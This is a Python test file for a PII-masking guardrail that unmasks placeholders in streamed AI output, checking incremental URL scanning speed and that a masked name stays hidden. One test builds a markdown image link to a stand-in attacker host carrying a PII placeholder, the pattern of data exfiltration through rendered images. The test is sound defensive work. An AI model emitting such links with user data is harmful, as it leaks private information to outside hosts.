"""08-tam-1a r3 MAJOR-r3-2 (KARARLAR "C17 URL bağlam kuralı, ek" (c)): the URL line scan is
incremental. A stream keeps its line state and scans only the new piece with a short overlap, and
stops scanning once the line is marked or cut, so a long single-line answer read in small pieces
does not hold the API's event loop (r2 scanned the whole line again on every piece: 100,000
characters in 1-character pieces took 28 s). A piece without a placeholder pays the same small
cost."""

import asyncio
import time

import pytest

from ffcore.guardrails.masking import ContextReveal, StreamDetokenizer
from tests.unit.test_08t_c17_masking import _store_with

run = asyncio.run
NAME = "Ayşe Kaya"


def _timed(pieces, cls):
    # CPU time of this process (r5 NOTE-7): other work on the machine does not count; the r2 scan
    # needed 13 s here, the incremental one about 0.4 s.
    store, _ = _store_with([NAME])

    async def go():
        if cls is StreamDetokenizer:
            sd = StreamDetokenizer(store, "run-1")
            start = time.process_time()
            for p in pieces:
                await sd.feed(p)
            await sd.flush()
        else:
            cr = ContextReveal(store, "run-1")
            start = time.process_time()
            for p in pieces:
                await cr.data({"text": p}, stream_text=True)
        return time.process_time() - start

    return run(go())


@pytest.mark.parametrize("cls", [StreamDetokenizer, ContextReveal])
def test_08t_r3_long_line_in_one_character_pieces(cls):
    text = "a" * 100_000  # no marker, no line break
    assert _timed(list(text), cls) < 1.0


@pytest.mark.parametrize("cls", [StreamDetokenizer, ContextReveal])
def test_08t_r3_long_line_in_four_pieces(cls):
    text = "b" * 64_000
    pieces = [text[i : i + 16_000] for i in range(0, len(text), 16_000)]
    assert _timed(pieces, cls) < 0.2


@pytest.mark.parametrize("cls", [StreamDetokenizer, ContextReveal])
def test_08t_r3_marker_split_over_pieces_still_seen(cls):
    # The overlap keeps a marker that crosses a piece boundary, after a long unmarked prefix.
    store, _ = _store_with([NAME])
    text = "x" * 20_000 + " ![i](h" + "ttps://evil.example/?q=<<PII_1>>)"
    pieces = ["x" * 20_000 + " ![i]", "(h", "ttps://evil.example/?q=", "<<PII_1>>)"]
    assert "".join(pieces) == text

    async def go():
        if cls is StreamDetokenizer:
            sd = StreamDetokenizer(store, "run-1")
            out = [await sd.feed(p) for p in pieces]
            out.append(await sd.flush())
        else:
            cr = ContextReveal(store, "run-1")
            out = [(await cr.data({"text": p}, stream_text=True))["text"] for p in pieces]
        return "".join(out)

    assert NAME not in run(go())
